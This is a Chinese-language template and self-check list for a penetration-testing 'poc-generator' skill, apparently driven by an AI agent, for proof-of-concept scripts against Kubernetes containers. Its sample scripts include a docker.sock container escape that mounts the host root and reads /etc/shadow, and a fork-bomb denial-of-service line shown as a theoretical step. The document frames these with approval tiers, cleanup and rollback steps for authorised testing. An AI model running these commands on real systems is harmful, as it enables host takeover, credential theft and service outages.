# poc-generator POC 脚本模板与自检清单

> 本文件为 `skills/poc-generator/SKILL.md` 的 POC 脚本格式模板参考。核心工作流见 SKILL.md。

---

## POC 格式规范（设计文档 5.16.5 节）

### 通用格式要求

所有 POC 必须遵循以下格式规范：

1. **可信度标注**：每个 POC 必须标注可信度等级
   - `C1 实证复现 ✅✅` — 5 项全满足 + L2 差分证明
   - `C2 条件实证 ✅` — 前置满足 + 理论链路完整
   - `C3 风险线索 ⚠️` — 配置隐患 + 前置不完全

2. **验证层级标注**：每个 POC 必须标注最高验证层级
   - `L1` — 只读探测验证
   - `L2` — 容器内攻击验证
   - `L3` — 条件验证（破坏性操作理论推导）

3. **每步标注执行上下文**：
   - `[L0]` — 宿主机观察（ssh_execute 直接执行）
   - `[L1]` — 容器内观察（kubectl exec）
   - `[L2]` — 容器内攻击验证（kubectl exec 攻击命令）

4. **L3 条件验证的特殊标注**：
   - POC 标题标注 ⚠️
   - 每步标注 `[L3-条件验证]`
   - 附不可安全复现原因说明
   - 替代证据章节

---

## C1 实证复现类 POC 格式

```bash
#!/bin/bash
# POC: 容器通过docker.sock逃逸至宿主机
# 可信度: C1 实证复现 ✅✅
# 验证层级: L2
# CHAIN: CHAIN-001 步骤 1/3
# ATK-CAND: ATK-CAND-001

SERVER="${1:?用法: $0 <server-name>}"
POC_DIR="/tmp/poc-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$POC_DIR"

echo "====== POC: 容器通过docker.sock逃逸至宿主机 ======"
echo "可信度: C1 实证复现 ✅✅"
echo "验证层级: L2"
echo ""

echo "### 步骤1: 确认前置条件 [L0+L1] ###"
echo "[L0] 检查Pod安全上下文..."
kubectl get pod backend-api -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

echo "[L1] 检查容器内docker.sock可见性..."
kubectl exec -n production backend-api -- ls -la /var/run/docker.sock
# 期望输出: srw-rw---- 1 root 999 ...

echo ""
echo "### 步骤2: 执行攻击验证 [L2] ###"
echo "[L2] 通过docker.sock逃逸..."
kubectl exec -n production backend-api -- docker run -v /:/host alpine ls /host/etc/shadow
# 期望输出: root:x:0:0:root:/root:/bin/sh ...

echo ""
echo "### 步骤3: 差分证明 [L0+L2] ###"
echo "[L0] 攻击前: docker ps 无异常容器"
echo "[L0] 攻击后: docker ps 出现新 alpine 容器"
echo "[L2] 攻击后: 可从容器内读取宿主机 /etc/shadow"

echo ""
echo "### 清理步骤 ###"
echo "[L2] 清理临时容器..."
kubectl exec -n production backend-api -- docker rm -f <container_id>
echo "[L0] 确认清理..."
docker ps | grep alpine
# 期望: 无残留容器
```

---

## C2 条件实证（不可安全复现）类 POC 格式

```bash
#!/bin/bash
# POC: 特权容器+无资源限制导致DoS
# ⚠️ 可信度: C2 条件实证 ✅ (不可安全复现)
# 验证层级: L3
# 不可复现原因: 实际执行fork bomb会导致宿主机CPU资源耗尽，影响生产环境
# CHAIN: CHAIN-002 步骤 2/2
# ATK-CAND: ATK-CAND-010

SERVER="${1:?用法: $0 <server-name>}"

echo "====== POC: 特权容器+无资源限制导致DoS ======"
echo "⚠️ 可信度: C2 条件实证 ✅ (不可安全复现)"
echo "验证层级: L3"
echo "不可复现原因: 实际执行fork bomb会导致宿主机CPU资源耗尽，影响生产环境"
echo ""

echo "### 步骤1: 确认前置条件 [L0] ###"
echo "[L0] 检查Pod特权模式..."
kubectl get pod xxx -o jsonpath='{.spec.securityContext.privileged}'
# 期望输出: true

echo "[L0] 检查资源限制..."
kubectl get pod xxx -o jsonpath='{.spec.containers[0].resources}'
# 期望输出: {} (无限制)

echo ""
echo "### 步骤2: 理论攻击路径 [⚠️ L3-条件验证] ###"
echo "⚠️ 以下步骤为理论推导，实际执行会导致服务不可用："
echo "  在特权容器内执行: :(){ :|:& };:"
echo "  预期影响: 宿主机CPU资源耗尽，所有Pod受影响"

echo ""
echo "### 替代证据 ###"
echo "[L0] 检查进程数限制..."
kubectl exec -n default test-pod -- cat /proc/sys/kernel/pids_limit
# 替代证据: 显示无限制或限制值极高

echo "[L1] 检查cgroup pids限制..."
kubectl exec -n default test-pod -- cat /sys/fs/cgroup/pids/pids.max
# 替代证据: 显示 max（未设置Pod级别限制）
```

---

## 破坏性 POC 格式

```bash
#!/bin/bash
# POC: <攻击名称>
# destructive: true
# 可信度: C2 条件实证 ⚠️
# 验证层级: L3
# ⚠️ 本POC包含破坏性操作，仅提供条件验证替代证据
# CHAIN: CHAIN-XXX
# ATK-CAND: ATK-CAND-XXX

SERVER="${1:?用法: $0 <server-name>}"

echo "====== POC: <攻击名称> ======"
echo "⚠️ destructive: true — 本POC为破坏性操作，只提供条件验证"
echo ""

echo "### 步骤1: 确认前置条件 [L0+L1] ###"
# 非破坏性条件检查命令

echo ""
echo "### 步骤2: 条件验证 [L3] ###"
# ⚠️ 不执行破坏性命令，只展示理论路径

echo ""
echo "### 回滚步骤 ###"
echo "本POC未执行任何破坏性操作，无需回滚"
echo "如果将来需要实际验证，回滚步骤如下："
echo "  1. <回滚步骤1>"
echo "  2. <回滚步骤2>"
```

---

## POC 脚本结构模板

```bash
#!/bin/bash
# ========================================
# POC: <攻击名称>
# ========================================
# 可信度: <C1/C2/C3> <描述>
# 验证层级: <L1/L2/L3>
# destructive: <true/false>
# CHAIN: <CHAIN-XXX>
# ATK-CAND: <ATK-CAND-XXX>
# <如为不可安全复现: 不可复现原因: xxx>

SERVER="${1:?用法: $0 <server-name>}"
POC_DIR="/tmp/poc-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$POC_DIR"

echo "====== POC: <攻击名称> ======"
echo "可信度: <可信度标注>"
echo "验证层级: <验证层级>"
echo ""

# 步骤1: 确认前置条件 [L0+L1]
echo "### 步骤1: 确认前置条件 [L0+L1] ###"
# [L0] 宿主机观察命令
# [L1] 容器内观察命令

# 步骤2: 攻击验证 [L2] 或理论攻击路径 [⚠️ L3]
echo "### 步骤2: <攻击验证 / 理论攻击路径> [<L2/L3>] ###"
# [L2] 攻击命令 或 [L3] 理论推导

# 步骤3: 差分证明 [L0+L2] 或 替代证据 [L0+L1]
echo "### 步骤3: 差分证明 / 替代证据 ###"
# 差分证据或替代证据

# 清理步骤
echo "### 清理步骤 ###"
# 清理命令
# 确认清理

echo ""
echo "POC 执行完成"
```

---

## POC 自检清单（每个脚本生成后自检）

- [ ] SERVER 参数化，不硬编码服务器名
- [ ] 包含前置条件检查步骤
- [ ] 包含攻击验证步骤（或理论推导 + ⚠️ 标注）
- [ ] 包含差分证明步骤（或替代证据）
- [ ] 包含清理步骤（破坏性 POC 包含回滚说明）
- [ ] 可信度标注（C1/C2/C3）
- [ ] 验证层级标注（L1/L2/L3）
- [ ] 每步标注执行上下文 `[L0]`/`[L1]`/`[L2]`
- [ ] CHAIN 和 ATK-CAND 编号正确
- [ ] L3 条件验证 POC 标注 ⚠️ 和不可安全复现原因
- [ ] 破坏性 POC 标注 `destructive: true`

---

## poc_readme.md 结构

```markdown
# POC 操作说明

## 概述

本目录包含渗透测试过程中验证的攻击链 POC 脚本。

| POC 脚本 | 攻击 | 可信度 | 验证层级 | CHAIN | 破坏性 |
|----------|------|--------|---------|-------|--------|
| poc_CHAIN-001_step1_socket_escape.sh | Docker套接字逃逸 | C1 ✅✅ | L2 | CHAIN-001 | 否 |
| poc_CHAIN-001_step2_secret_exfil.sh | Secret窃取 | C1 ✅✅ | L2 | CHAIN-001 | 否 |
| poc_CHAIN-001_step3_lateral_move.sh | 横向移动 | C2 ✅ | L3 | CHAIN-001 | 否 |

## 使用方法

### 前提条件
1. 已配置 SSH 连接的目标服务器
2. 已安装 kubectl 且已配置 kubeconfig
3. 已获取必要的审批（根据 POC 验证层级）
4. 已备份目标环境关键配置

### 执行方式
```bash
# 单个 POC 执行
bash evidence/poc/poc_scripts/poc_CHAIN-001_step1_socket_escape.sh <server-name>

# 按链顺序执行
for step in 1 2 3; do
  bash evidence/poc/poc_scripts/poc_CHAIN-001_step${step}_*.sh <server-name>
done
```

### 审批要求

| 验证层级 | 审批要求 | 说明 |
|---------|---------|------|
| L1 | 无需审批 | 只读探测 |
| L2 | 标准/自动 | 根据会话配置 |
| L3 | 快速/自动 | 条件验证，非破坏性 |
| L4 | 手动确认 | 逃逸验证 |
| L5 | 不可安全复现，理论验证 | 不可安全复现 |

## 风险警告

⚠️ **重要风险提示**：

1. **执行环境风险**：所有 POC 在生产环境执行前必须在测试环境验证
2. **数据泄露风险**：部分 POC 可能读取敏感数据（Secret、证书等），执行后立即清理
3. **服务中断风险**：标注 `destructive: true` 的 POC 可能导致服务中断
4. **不可逆操作风险**：部分攻击步骤可能创建持久性后门，务必执行清理步骤

## 可信度说明

| 标记 | 含义 | 说明 |
|------|------|------|
| C1 ✅✅ | 实证复现 | 5项门槛全满足 + L2 差分证明，实际可复现 |
| C2 ✅ | 条件实证 | 前置条件满足 + 理论链路完整，条件成立 |
| C2 ✅ (不可安全复现) | 条件实证 | 前置条件满足但实际执行影响生产，理论推导 |
| C3 ⚠️ | 高风险线索 | 配置隐患 + 前置不完全，建议补充验证 |

## 验证层级说明

| 层级 | 名称 | 执行位置 | 说明 |
|------|------|---------|------|
| L0 | 宿主机观察 | SSH 到宿主机 | 发现前置条件、收集配置信息 |
| L1 | 容器内观察 | kubectl exec 进入 Pod | 验证攻击者视角可见性 |
| L2 | 容器内攻击验证 | kubectl exec 执行攻击命令 | 实际复现漏洞路径 |
| L3 | 条件验证 | 不执行破坏性命令 | 理论推导（标注 ⚠️） |

## 回滚步骤

### 通用回滚
1. 清理 `/tmp/poc-*` 临时目录
2. 清理上传的临时工具 (`rm -rf /tmp/cpt-tools/`)
3. 删除 POC 创建的临时容器/Pod

### 各 POC 特定回滚
（每个 POC 的清理步骤已在脚本中包含）
```
